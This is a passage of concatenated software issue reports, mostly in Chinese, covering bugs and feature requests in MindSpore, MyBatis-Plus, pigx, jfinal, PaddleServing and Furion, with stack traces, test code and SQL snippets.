org.springframework.transaction.interceptor.TransactionInterceptor$1.proceedWithInvocation(TransactionInterceptor.java:99) at org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:282) at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:96) at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:179) at org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:673) at ******.****.service.****$$EnhancerBySpringCGLIB$$4513da11.****(&lt;generated&gt;) at ******.schedule.****.****(****.kt:18) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.springframework.scheduling.support.ScheduledMethodRunnable.run(ScheduledMethodRunnable.java:65) at org.springframework.scheduling.support.DelegatingErrorHandlingRunnable.run(DelegatingErrorHandlingRunnable.java:54) at java.util.concurrent.Executors$RunnableAdapter.call$$$capture(Executors.java:511) at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java) at java.util.concurrent.FutureTask.runAndReset(FutureTask.java:308) at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.access$301(ScheduledThreadPoolExecutor.java:180) at java.util.concurrent.ScheduledThreadPoolExecutor$ScheduledFutureTask.run(ScheduledThreadPoolExecutor.java:294) at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) at java.lang.Thread.run(Thread.java:748) Caused by: org.apache.ibatis.reflection.ReflectionException: Illegal overloaded getter method with ambiguous type for property asc in class class com.baomidou.mybatisplus.plugins.pagination.Pagination. This breaks the JavaBeans specification and can cause unpredictable results. at org.apache.ibatis.reflection.Reflector.resolveGetterConflicts(Reflector.java:138) at org.apache.ibatis.reflection.Reflector.addGetMethods(Reflector.java:108) at org.apache.ibatis.reflection.Reflector.&lt;init&gt;(Reflector.java:63) at org.apache.ibatis.reflection.DefaultReflectorFactory.findForClass(DefaultReflectorFactory.java:44) at org.apache.ibatis.reflection.MetaClass.&lt;init&gt;(MetaClass.java:39) at org.apache.ibatis.reflection.MetaClass.forClass(MetaClass.java:43) at org.apache.ibatis.reflection.wrapper.BeanWrapper.&lt;init&gt;(BeanWrapper.java:40) at org.apache.ibatis.reflection.MetaObject.&lt;init&gt;(MetaObject.java:56) at org.apache.ibatis.reflection.MetaObject.forObject(MetaObject.java:64) at org.apache.ibatis.reflection.MetaObject.metaObjectForProperty(MetaObject.java:146) at org.apache.ibatis.reflection.MetaObject.setValue(MetaObject.java:129) at org.apache.ibatis.reflection.MetaObject.setValue(MetaObject.java:138) at com.baomidou.mybatisplus.plugins.PaginationInterceptor.intercept(PaginationInterceptor.java:143) at org.apache.ibatis.plugin.Plugin.invoke(Plugin.java:61) at com.sun.proxy.$Proxy131.prepare(Unknown Source) at org.apache.ibatis.executor.SimpleExecutor.prepareStatement(SimpleExecutor.java:85) at org.apache.ibatis.executor.SimpleExecutor.doQuery(SimpleExecutor.java:62) at org.apache.ibatis.executor.BaseExecutor.queryFromDatabase(BaseExecutor.java:324) at org.apache.ibatis.executor.BaseExecutor.query(BaseExecutor.java:156) at org.apache.ibatis.executor.BaseExecutor.query(BaseExecutor.java:136) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:148) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:433) ... 39 common frames omitted winner: public boolean com.baomidou.mybatisplus.plugins.pagination.Pagination.isAsc() candidate: public java.util.List com.baomidou.mybatisplus.plugins.pagination.Pagination.getAsc()"
[CT][MS][OP]AffineGrid args valid and error msg need optimize,"AffineGrid 参数校验以及报错信息有待优化 / 硬件环境: /device ascend /device cpu : -- MindSpore version :众智whl包 -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph 执行测试用例 报错， 且给出明确的提示信息 报错信息太笼统   <code>: def test_affinegrid_theta_n_2_3_out_size_ncdhw(): theta = Tensor(np.random.rand(8, 2, 3).astype(np.float16)) out_size = Tensor(np.array([8, 6, 7, 2, 1]).astype(np.int32)) fact = AffineGridMock(attributes={'align_corners': True}, inputs=[theta, out_size]) # with pytest.raises(ValueError): &gt; fact.forward_mindspore_impl() def test_affinegrid_theta_n_2_3_out_size_ncdhw(): theta = Tensor(np.random.rand(8, 2, 3).astype(np.float16)) out_size = Tensor(np.array([8, 6, 7, 2, 1]).astype(np.int32)) fact = AffineGridMock(attributes={'align_corners': True}, inputs=[theta, out_size]) # with pytest.raises(ValueError): &gt; fact.forward_mindspore_impl() E ValueError: build/mindspore/merge/mindspore/core/ops_merge.cc:1224 AffineGridInferShape] For AffineGrid, theta's shape and output_size's dimensions must match."
【众智】【计算-TBE接入】SoftMarginLossGrad,SoftMarginLoss算子的反向 2 . 接口描述 接口目录：mindspore/ops/operations/_grad_ops.py reduction str 属性 logits labels dout gradient 对应底层算子 对应底层AI Core算子SoftMarginLossGrad   <code>: class SoftMarginLossGrad(Primitive):
pigx-bi-platform如何增加配置表维护,环境信息 pigx版本: 3.11 是否修改包名: 否 当前3.11增加ureport2，我之前独立启动了ureport应用，然后在pigx下增加了一个报表文件角色授权的关系维护，想知道怎么在新增的pigx-bi下增加配置表的维护，把之前弄的贡献出来。 效果： 1、报表设计：https://ureport.pig4cloud.com/ureport/designer 2、维护自定义表，如：http://localhost:8080/#/bi/ureportfile/index ps：倒腾了一天总是时好时坏。 当引入以下包时，有次好了，但是大部分提示， 当再增加pigx-common-data包后，系统提示登录报错： 2020-12-03 08:02:55.723 INFO 16860 --- [ main] o.s.s.concurrent.ThreadPoolTaskExecutor : Shutting down ExecutorService 'applicationTaskExecutor' 2020-12-03 08:02:55.730 INFO 16860 --- [ main] com.alibaba.druid.pool.DruidDataSource : {dataSource-1} closing ... 2020-12-03 08:02:55.735 INFO 16860 --- [ main] com.alibaba.druid.pool.DruidDataSource : {dataSource-1} closed 2020-12-03 08:02:55.814 INFO 16860 --- [ main] ConditionEvaluationReportLoggingListener : Error starting ApplicationContext. To display the conditions report re-run your application with 'debug' enabled. 2020-12-03 08:02:56.259 ERROR 16860 --- [ main] o.s.b.d.LoggingFailureAnalysisReporter : APPLICATION FAILED TO START Description: Parameter 0 of constructor in com.pig4cloud.pigx.common.security.serializer.PigxTokenStoreAutoConfiguration required a bean of type 'com.pig4cloud.pigx.common.core.util.KeyStrResolver' that could not be found. Action: Consider defining a bean of type 'com.pig4cloud.pigx.common.core.util.KeyStrResolver' in your configuration.   <code>: &lt;!-- 使用druid --&gt; &lt;dependency&gt; &lt;groupId&gt;com.alibaba&lt;/groupId&gt; &lt;artifactId&gt;druid-spring-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;!--mybatis--&gt; &lt;dependency&gt; &lt;groupId&gt;com.baomidou&lt;/groupId&gt; &lt;artifactId&gt;mybatis-plus-boot-starter&lt;/artifactId&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;com.pig4cloud&lt;/groupId&gt; &lt;artifactId&gt;pigx-common-security&lt;/artifactId&gt; &lt;/dependency&gt;
[CT][MS][Outer] Outer has some problems at  gpu and ascend,"在gpu和ascend环境,两种模式下test_f_outer.py::test_outer_input_dtype_float16_1d在测试时输入shape(50,),出现AssertionError test_outer_input_dtype_float16_1d ascend 正常用例，预期通过   <code>: @Level0 def test_outer_input_dtype_float16_1d(): input_list = [] x0 = Tensor(np.random.randn(50, ), dtype=mstype.float16) input_list.append(x0) x1 = Tensor(np.random.randn(50, ), dtype=mstype.float16) input_list.append(x1) fact = OuterMock(inputs=input_list) fact.forward_cmp() fact.grad_cmp() def _count_unequal_element(data_expected, data_me, rtol, atol): assert data_expected.shape == data_me.shape total_count = len(data_expected.flatten()) error = np.abs(data_expected - data_me) greater = np.greater(error, atol + np.abs(data_me) * rtol) loss_count = np.count_nonzero(greater) assert (loss_count / total_count) &lt; rtol, \ ""\ndata_expected_std:{0}\ndata_me_error:{1}\nloss:{2}"". \ format(data_expected[greater], data_me[greater], error[greater])"
sql管理功能怎么把重复的sql抽离？,"#namespace(""product"") #sql(""pageProductByArea"") select p.*,pt.name as product_type,u.phone as seller_phone,u.name as seller_name,u.avator_url as seller_avator_url from p inner join u on p.seller_id = u.id inner join pt on p.pt_id = pt.id where p.area_id = ? and p.id &lt; ? order by p.id desc limit 10 #end #sql(""allProductByArea"") select p.*,pt.name as product_type,u.phone as seller_phone,u.name as seller_name,u.avator_url as seller_avator_url from p inner join u on p.seller_id = u.id inner join pt on p.pt_id = pt.id where p.area_id = ? order by p.id desc limit 10 #end #sql(""allProductByAreaAndType"") select p.*,pt.name as product_type,u.phone as seller_phone,u.name as seller_name,u.avator_url as seller_avator_url from p inner join u on p.seller_id = u.id inner join pt on p.pt_id = pt.id where p.area_id = ? and p.pt_id = ? order by p.id desc limit 10 #end #sql(""pageProductByAreaAndType"") select p.*,pt.name as product_type,u.phone as seller_phone,u.name as seller_name,u.avator_url as seller_avator_url from p inner join u on p.seller_id = u.id inner join pt on p.pt_id = pt.id where p.area_id = ? and p.pt_id = ? and p.id &lt; ? order by p.id desc limit 10 #end #sql(""findById"") select p.*,pt.name as product_type,u.phone as seller_phone,u.name as seller_name,u.avator_url as seller_avator_url from p inner join u on p.seller_id = u.id inner join pt on p.pt_id = pt.id where p.id = ? #end #end 如上sql所示，每一条sql都很长，但可以看出大部分都是重复的sql，只有后面的条件部分稍微有点不同，我希望把上面相同的部分抽离出来，一旦product表需要增加更多关联的查询的时候可以单独维护一句查询sql即可。 通过阅读jfinal3.0的文档，我做了如下的尝试，使用define定义sql的模板函数，把重复的sql做抽离，但是这个过程中遇到了一些问题。 #namespace(""product"") #define selectProduct(con) select p.*,pt.name as product_type,u.phone as seller_phone,u.name as seller_name,u.avator_url as seller_avator_url from p inner join u on p.seller_id = u.id inner join pt on p.pt_id = pt.id where #(con) #end #sql(""findById"") #product.selectProduct(""p.id = ?"") #end #end 如上sql所示，我把重复的部分抽离出来定义在#define指令中。运行测试代码时报出如下错误: Caused by: java.sql.SQLException: Parameter index out of range (1 &gt; number of parameters, which is 0). 看上去像是con填入的参数作为纯字符串填入到sql中了，sql占位符并没有起作用。 请问在当前版本的jfinal sql管理功能中有没有办法可以做到上面描述的需求？跪求指点   <code>: product user product_type product user product_type product user product_type product user product_type product user product_type product user product_type"
Add functions like flat_inner_dims in Tensor,"Sometimes we need to flatten a tensor to a matrix by collapsing all tensor dimensions but the last NDIMS-1 into the first dimension, Or by collapsing all tensor dimensions but the first NDIMS-1 into the first dimension. Like which tensorflow does in it's .   <code>: tensor.h:L297"
【众智】【计算-AICPU接入】Cumprod,AICPU算子接入 算子交付规格-误差验收标准： complex64： 2e-5 complex128： 2e-8 在指定轴上计算累加乘积 exclusive bool 属性 reverse bool 属性 x axis int y 对应底层算子 对应底层AI CPU算子Cumprod Classify Name Type Type Range Required Format INPUT x NumberType TRUE INPUT axis IndexNumberType TRUE OUTPUT y NumberType TRUE ATTR exclusive bool FALSE ATTR reverse bool FALSE 标杆接口参考 TF接口： https://www.tensorflow.org/api_docs/python/tf/raw_ops/Cumprod 3. 异常处理 4. 算子反向 参考TF反向函数_CumprodGrad tensorflow/tensorflow/python/ops/math_grad.py _CumprodGrad   <code>: class CumProd(PrimitiveWithInfer):
表格组件中，对于工具栏按钮与行内按钮的设置无法按钮预设定义执行。,"表格中，提供了ShowDefaultButtons，以定义工具栏按钮；提供了ShowExtendButtons以定义行内按钮。 以上本意应是对工具栏和行内的按钮可分别进行定义，如：新增、修改、删除三个按钮，可定义为工具栏上仅显示新增，行内按钮显示修改、删除按钮。 但实际效果，并不能按钮定义正确执行，修改、删除按钮均跟随工具栏定义显示或消失。 组件版本 latest 浏览器 all Server Side 如下定义：正确的结果应是工具栏仅显示新增按钮，不显示修改和删除按钮； 但实际上，工具栏的修改、删除按钮消失了，行内的修改、删除按钮也消失了。   <code>: ShowExtendButtons=""true"" ShowExtendEditButton=""true"" ShowExtendDeleteButton=""true"" ShowDefaultButtons=""true"" ShowAddButton=""true"" ShowEditButton=""false"" ShowDeleteButton=""false"""
【众智】【计算-AICPU开发】SelfAdjointEig,AICPU算子接入 计算伴随方阵的特征分解。 Python层接口 接口目录：mindspore/ops/operations/math_ops.py input_x eigen_value eigen_vector compute_v bool 属性 对应底层算子 对应底层AICPU算子SelfAdjointEig https://www.tensorflow.org/api_docs/python/tf/raw_ops/SelfAdjointEig 3. 异常处理 4. 算子反向 无需实现反向算子。 （实现对标SelfAdjointEigV2，有反向，未发放）   <code>: class SelfAdjointEig(Primitive):
ops.concat don't support list of Tensor ,"ops.concat don't support list of Tensor   <code>: import mindspore import numpy as np concat_op_0 = mindspore.ops.Concat(0) s = [] np_array = np.random.randn(16,3,8,8) m = mindspore.Tensor(np_array,mindspore.float32) s.append(m) np_array = np.random.randn(16,3,8,8) m = mindspore.Tensor(np_array,mindspore.float32) s.append(m) a = concat_op_0(s)"
"[MS][LITE][NNAPI]model build failed ,while setting kNNAPI mode in android mobile","使用最新版本包，在android手机上设置delegatemode为NNAPI时，模型build失败，返回-1 / 硬件环境: /device GPU/CPU : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): 取master分支编译版本包，设置MSLITE_ENABLE_NNAPI=on 编译测试用例 vivo手机上执行用例 用例执行成功   <code>: TEST(ms, Unify_NNAPI_predict_003) { printf(""==========Context==========\n""); auto context = std::make_shared&lt;Context&gt;(); context-&gt;SetBuiltInDelegate(mindspore::kNNAPI); mindspore::DelegateMode delegate_model = context-&gt;GetBuiltInDelegate(); ASSERT_EQ(delegate_model, mindspore::DelegateMode::kNNAPI); auto cpu_device_info = std::make_shared&lt;CPUDeviceInfo&gt;(); context-&gt;MutableDeviceInfo().push_back(cpu_device_info); size_t size; size_t *ptr_size = &amp;size; const char *modelPath = ""./data/inception_v3.ms""; char *graphBuf = ReadFile(modelPath, ptr_size); printf(""==========CompileGraph==========\n""); Model model; Status model_ret; model_ret = model.Build(graphBuf, size, ModelType::kMindIR, context); std::cout &lt;&lt; ""ModelBuild StatusCode:"" &lt;&lt; static_cast&lt;int&gt;(model_ret.StatusCode()) &lt;&lt; std::endl; ASSERT_EQ(model_ret, kSuccess); printf(""==========GetInputs==========\n""); size_t size1; size_t *ptr_size1 = &amp;size1; const char *input_file = ""./data/inception_v3_0.bin""; char *imageBuf = ReadFile(input_file, ptr_size1); std::vector&lt;MSTensor&gt; inputs = model.GetInputs(); MSTensor in_tensor = inputs[0]; auto shape = in_tensor.Shape(); auto imageBuf_nhwc = new char[size1]; PackNCHWToNHWCFp32(imageBuf, imageBuf_nhwc, shape[0], shape[1] * shape[2], shape[3]); void *in_data = in_tensor.MutableData(); memcpy(in_data, imageBuf_nhwc, size1); printf(""==========RunGraph==========\n""); std::vector&lt;MSTensor&gt; outputs; Status res_predict; res_predict = model.Predict(inputs, &amp;outputs); std::cout &lt;&lt; ""RunGraph StatusCode:"" &lt;&lt; static_cast&lt;int&gt;(res_predict.StatusCode()) &lt;&lt; std::endl; ASSERT_EQ(res_predict, kSuccess); printf(""==========GetOutputs==========\n""); std::vector&lt;MSTensor&gt; msOutputs = model.GetOutputs(); MSTensor out_tensor = msOutputs.front(); ASSERT_NE(out_tensor, nullptr); printf(""==========compFp32WithTData==========\n""); string resultPath = ""./data/inception_v30_output.t""; std::cout &lt;&lt; ""------------------resulPath ==== "" &lt;&lt; resultPath &lt;&lt; ""------------------"" &lt;&lt; std::endl; float *data1 = reinterpret_cast&lt;float *&gt;(out_tensor.MutableData()); for (size_t i = 0; i &lt; 10; ++i) { printf(""%f "", data1[i]); } bool result = compFp32WithTData(data1, resultPath, 0.01, 0.01, false); EXPECT_EQ(result, true); } PD1986:/data/local/tmp/cy $ ./test_basic_predict ms_Unify_NNAPI_predict_003 [ptest]Running ms_Unify_NNAPI_predict_003==========Context========== [common.cpp] Loading data from: ./data/inception_v3.ms [common.cpp]Read Binary Data Over, get tensorSize as: 95336336 ==========CompileGraph========== ModelBuild StatusCode:-1 ((model_ret)==(kSuccess))Assertion Failed Testcase Name: ms_Unify_NNAPI_predict_003 File: /usr1/home/chenyi/shangku/master/MindSporeTest/predict/lite/cpp/test_unify_api_normal.cpp Line:3721 [ptest]Finish running ms_Unify_NNAPI_predict_003[ms_Unify_NNAPI_predict_003]:Failed 06-11 03:42:12.379 28147 28147 D MS_LITE : [mindspore/lite/src/litert/scheduler.cc:1130] FindGpuKernel] Get gpu op success: Conv2DFusion 06-11 03:42:12.379 28147 28147 D MS_LITE : [mindspore/lite/src/litert/kernel/opencl/kernel/concat.cc:86] CheckSpecs] concat at axis=: 3 06-11 03:42:12.379 28147 28147 D MS_LITE : [mindspore/lite/src/litert/scheduler.cc:1130] FindGpuKernel] Get gpu op success: Concat 06-11 03:42:12.379 28147 28147 D MS_LITE : [mindspore/lite/src/litert/scheduler.cc:1130] FindGpuKernel] Get gpu op success: Conv2DFusion 06-11 03:42:12.379 28147 28147 D MS_LITE : [mindspore/lite/src/litert/kernel/opencl/kernel/concat.cc:86] CheckSpecs] concat at axis=: 3 06-11 03:42:12.379 28147 28147 D MS_LITE : [mindspore/lite/src/litert/scheduler.cc:1130] FindGpuKernel] Get gpu op success: Concat 06-11 03:42:12.379 28147 28147 D MS_LITE : [mindspore/lite/src/litert/scheduler.cc:1130] FindGpuKernel] Get gpu op success: AvgPoolFusion 06-11 03:42:12.379 28147 28147 D MS_LITE : [mindspore/lite/src/litert/scheduler.cc:1130] FindGpuKernel] Get gpu op success: Conv2DFusion 06-11 03:42:12.379 28147 28147 D MS_LITE : [mindspore/lite/src/litert/scheduler.cc:1130] FindGpuKernel] Get gpu op success: Reshape 06-11 03:42:12.379 28147 28147 D MS_LITE : [mindspore/lite/src/litert/scheduler.cc:1130] FindGpuKernel] Get gpu op success: Softmax 06-11 03:42:12.400 28147 28147 I MtkUtils: NeuroPilot label:alps-mp-q0.mp2.tc19sp-V1.0.1_bbk.q0mp2.k6889v1.64_P150 06-11 03:42:12.400 28147 28147 E libc : Access denied finding property ""ro.vendor.mtk_nn.option"" 06-11 03:42:12.400 28147 28147 I MtkOptions: Empty property 06-11 03:42:12.400 28147 28147 I TypeManager: Failed to read /vendor/etc/nnapi_extensions_app_allowlist ; No app allowlisted for vendor extensions use. 06-11 03:42:12.396 28147 28147 W test_basic_pred: type=1400 audit(0.0:18146): avc: denied { read } for name=""u:object_r:mtk_nn_option_prop:s0"" dev=""tmpfs"" ino=19553 scontext=u:r:shell:s0 tcontext=u:object_r:mtk_nn_option_prop:s0 tclass=file permissive=0 06-11 03:42:12.498 28147 28147 E ValidateHal: Operand 318 with lifetime TEMPORARY_VARIABLE is not being written to. 06-11 03:42:12.498 28147 28147 E ModelBuilder: ANeuralNetworksModel_finish called on invalid model 06-11 03:42:12.498 28147 28147 E ModelBuilder: ANeuralNetworksCompilation_create passed an unfinished or invalid model 06-11 03:42:12.498 28147 28147 E MS_LITE : [mindspore/lite/src/litert/delegate/nnapi/nnapi_subgraph.cc:123] CompileNNAPIModel] Create compilateion failed. 06-11 03:42:12.498 28147 28147 E MS_LITE : [mindspore/lite/src/litert/delegate/nnapi/nnapi_delegate.cc:193] Build] Compile nnapi model failed. 06-11 03:42:12.498 28147 28147 E MS_LITE : [mindspore/lite/src/litert/scheduler.cc:566] ReplaceDelegateKernels] Delegate prepare kernels failed. 06-11 03:42:12.498 28147 28147 E MS_LITE : [mindspore/lite/src/litert/scheduler.cc:637] InitDelegateKernels] external delegate init failed. 06-11 03:42:12.498 28147 28147 E MS_LITE : [mindspore/lite/src/litert/scheduler.cc:468] Schedule] Repalce delegate kernels failed. 06-11 03:42:12.498 28147 28147 E MS_LITE : [mindspore/lite/src/litert/lite_session.cc:557] CompileGraph] Schedule kernels failed: -1 06-11 03:42:12.498 28147 28147 E MS_LITE : [mindspore/lite/src/litert/lite_session.cc:1693] LoadModelAndCompileByBuf] Compile model failed 06-11 03:42:12.498 28147 28147 E MS_LITE : [mindspore/lite/src/litert/cxx_api/model/model_impl.cc:157] Build] Init session failed"
通过maven中jboos插件启动，登录后点击设置报500.,"解决方案：SysPropertyAction input（）方法获取site.properties方式不通用，容易出问题。可改成``   <code>: String fileName=""site.properties""; ServletContext sc = Struts2Utils.getSession().getServletContext(); //String filePath = ""/WEB-INF/classes/conf/site/"".replace(""/"", File.separator); //String fileRealPath = sc.getRealPath(""/"")+filePath+fileName; //File file=new File(fileRealPath); ClassLoader cl = this.getClass().getClassLoader(); InputStream input = cl.getResourceAsStream(""conf/site/"".replace(""/"", File.separator)+fileName); //InputStreamReader fr = new InputStreamReader(new FileInputStream(file),""UTF-8""); InputStreamReader fr=new InputStreamReader(input,""UTF-8"");"
PaddleServing faster rcnn demo 预测时报错,"使用paddle1.8.2，paddleserving develop版本，部署起来预测时报错如下，因为看报错是paddle这边报的，所以发这边了。   <code>: [root@c99a526ec87f paddle]# python3.6 test_client2.py W0712 09:09:58.147349 1843 analysis_predictor.cc:133] Profiler is activated, which might affect the performance I0712 09:09:58.785828 1843 analysis_predictor.cc:872] MODEL VERSION: 1.7.1 I0712 09:09:58.785851 1843 analysis_predictor.cc:874] PREDICTOR VERSION: 1.8.2 I0712 09:09:58.786041 1843 analysis_predictor.cc:471] ir_optim is turned off, no IR pass will be executed --- Running analysis [ir_graph_build_pass] --- Running analysis [ir_graph_clean_pass] --- Running analysis [ir_analysis_pass] --- Running analysis [ir_params_sync_among_devices_pass] I0712 09:09:58.998006 1843 ir_params_sync_among_devices_pass.cc:41] Sync params from CPU to GPU --- Running analysis [adjust_cudnn_workspace_size_pass] --- Running analysis [inference_op_replace_pass] --- Running analysis [ir_graph_to_program_pass] I0712 09:09:59.093183 1843 analysis_predictor.cc:493] ======= optimize end ======= W0712 09:09:59.122561 1843 device_context.cc:252] Please NOTE: device: 0, CUDA Capability: 75, Driver API Version: 10.2, Runtime API Version: 10.0 W0712 09:09:59.126153 1843 device_context.cc:260] device: 0, cuDNN Version: 7.6. Traceback (most recent call last): File ""test_client2.py"", line 38, in &lt;module&gt; fetch=[""multiclass_nms""]) File ""/usr/local/lib/python3.6/site-packages/paddle_serving_app/local_predict.py"", line 127, in predict outputs = self.predictor.run(inputs) paddle.fluid.core_avx.EnforceNotMet: -------------------------------------------- C++ Call Stacks (More useful to developers): -------------------------------------------- 0 std::string paddle::platform::GetTraceBackString&lt;std::string const&amp;&gt;(std::string const&amp;, char const*, int) 1 paddle::platform::EnforceNotMet::EnforceNotMet(std::string const&amp;, char const*, int) 2 paddle::operators::ConvOp::GetExpectedKernelType(paddle::framework::ExecutionContext const&amp;) const 3 paddle::framework::OperatorWithKernel::ChooseKernel(paddle::framework::RuntimeContext const&amp;, paddle::framework::Scope const&amp;, paddle::platform::Place const&amp;) const 4 paddle::framework::OperatorWithKernel::RunImpl(paddle::framework::Scope const&amp;, paddle::platform::Place const&amp;, paddle::framework::RuntimeContext*) const 5 paddle::framework::OperatorWithKernel::RunImpl(paddle::framework::Scope const&amp;, paddle::platform::Place const&amp;) const 6 paddle::framework::OperatorBase::Run(paddle::framework::Scope const&amp;, paddle::platform::Place const&amp;) 7 paddle::framework::NaiveExecutor::Run() 8 paddle::AnalysisPredictor::Run(std::vector&lt;paddle::PaddleTensor, std::allocator&lt;paddle::PaddleTensor&gt; &gt; const&amp;, std::vector&lt;paddle::PaddleTensor, std::allocator&lt;paddle::PaddleTensor&gt; &gt;*, int) ------------------------------------------ Python Call Stacks (More useful to users): ------------------------------------------ File ""/usr/lib64/python2.7/site-packages/paddle/fluid/framework.py"", line 2525, in append_op attrs=kwargs.get(""attrs"", None)) File ""/usr/lib64/python2.7/site-packages/paddle/fluid/layer_helper.py"", line 43, in append_op return self.main_program.current_block().append_op(*args, **kwargs) File ""/usr/lib64/python2.7/site-packages/paddle/fluid/layers/nn.py"", line 1405, in conv2d ""data_format"": data_format, File ""/PaddleDetection/ppdet/modeling/backbones/resnet.py"", line 162, in _conv_norm name=_name + '.conv2d.output.1') File ""/PaddleDetection/ppdet/modeling/backbones/resnet.py"", line 430, in c1_stage name=_name) File ""/PaddleDetection/ppdet/modeling/backbones/resnet.py"", line 451, in __call__ res = self.c1_stage(res) File ""/PaddleDetection/ppdet/modeling/architectures/faster_rcnn.py"", line 89, in build body_feats = self.backbone(im) File ""/PaddleDetection/ppdet/modeling/architectures/faster_rcnn.py"", line 248, in test return self.build(feed_vars, 'test') File ""tools/export_model.py"", line 108, in main test_fetches = model.test(feed_vars) File ""tools/export_model.py"", line 125, in &lt;module&gt; main() ---------------------- Error Message Summary: ---------------------- InvalidArgumentError: input and filter data type should be consistent [Hint: Expected input_data_type == filter_data_type, but received input_data_type:2 != filter_data_type:5.] at (/paddle/paddle/fluid/operators/conv_op.cc:173) [operator &lt; conv2d &gt; error] W0712 09:10:02.100517 1923 device_tracer.cc:53] Invalid timestamp occurred. Please try increasing the FLAGS_multiple_of_cupti_buffer_size. -------------------------&gt; Profiling Report &lt;------------------------- Place: All Time unit: ms Sorted by total time in descending order in the same thread Total time: 303.444 Computation time Total: 201.3 Ratio: 66.3387% Framework overhead Total: 102.143 Ratio: 33.6613% ------------------------- GpuMemCpy Summary ------------------------- GpuMemcpy Calls: 172 Total: 83.4565 Ratio: 27.5031% GpuMemcpyAsync Calls: 3 Total: 3.2345 Ratio: 1.06593% GpuMemcpySync Calls: 169 Total: 80.222 Ratio: 26.4372% ------------------------- Event Summary ------------------------- Event Calls Total CPU Time (Ratio) GPU Time (Ratio) Min. Max. Ave. Ratio. thread0::load 169 202.819 202.819352 (1.000000) 0.000000 (0.000000) 0.017028 164.441 1.20011 0.668392 thread0::GpuMemcpySync:CPU-&gt;GPU 169 80.222 40.694908 (0.507279) 39.527102 (0.492721) 0.011679 23.2058 0.474686 0.264372 thread0::conv2d 1 17.1275 17.127503 (1.000000) 0.000000 (0.000000) 17.1275 17.1275 17.1275 0.0564438 thread0::GpuMemcpyAsync:CPU-&gt;GPU 3 3.2345 1.820567 (0.562860) 1.413929 (0.437140) 0.011064 3.19608 1.07817 0.0106593 thread0::feed 3 0.040244 0.040244 (1.000000) 0.000000 (0.000000) 0.006155 0.025493 0.0134147 0.000132624 [root@c99a526ec87f paddle]#"
oracle版本查询子部门语句有bug,"mysql版本语句为 oracle版本语句为 假设入参部门id都为10，部门表源数据都相同的情况下 测试数据如下： mysql版本部门表源数据   <code>: select * from sys_dept where find_in_set(#{deptId}, ancestors) select * from sys_dept where ancestors LIKE '%' || #{deptId} || '%' select * from sys_dept where find_in_set(10, ancestors) select * from sys_dept where ancestors LIKE '%10%'"
sys_route_conf 表字段长度问题,"环境信息 pigx版本: 4.2 是否修改包名: 是 提供详细 自定义包名后，下载邮件发送的包，打开后初始化mysql,启动AdminApplication发现少了表， 查看日志是少了表， 经过排查是因为我的名称比较长，生成了如下的sql INSERT INTO VALUES (4, 'elastic-job定时任务模块', 'runners-daemon-elastic-job', '[{""args"": {""_genkey_0"": ""/daemon/**""}, ""name"": ""Path""}]', '[]', 'lb://runners-daemon-elastic-job', 0, NULL, '2019-10-16 16:44:41', '2019-11-05 22:36:59', '0') 发现route_id超过了30个字符 而表定义的 varchar(30) DEFAULT NULL, 是30个字符，导致了后面的sql都没有运行， AdminApplication无法正常运行，其他表没排查是否也是有这个问题，我的网关无法启动，可能也是相同原因   <code>: sys_route_conf route_id"
 [新功能] 数据库功能,"https://docs.microsoft.com/zh-cn/ef/core/providers/?tabs=dotnet-core-cli   <code>: var user =new User(); user.Insert(); ""select * from test"".ExecuteSql();"
Build will fail using cmake version older than 3.5,I used cmake 3.2 to compile and then got an error with unpacking with . Using cmake 3.5 doesn't seems to have such problem.   <code>: libprotobuf.so ar
同一个数据库定位器不同Connstring如何得到两个不同的Repository对像,"Furion 版本号 2.19 .NET SDK 版本号 .NET5 .NET6 .NET7 Web 项目类型 WebApi Mvc Razor Pages Blazor Server MinApp 操作系统和版本 Windows Linux MacOS 其他 代码环境 开发环境（Development） 生产环境（Production） 测试环境   <code>: var rep=Db.GetRepository&lt;T&gt;(); rep.Change&lt;T, DBContextLocator&gt;(); rep.ChangeDatabase(dbconfig.ConnString2222); var rep1=Db.GetRepository&lt;T&gt;(); rep1.Change&lt;T, DBContextLocator&gt;(); rep1.ChangeDatabase(dbconfig.ConnString111);"
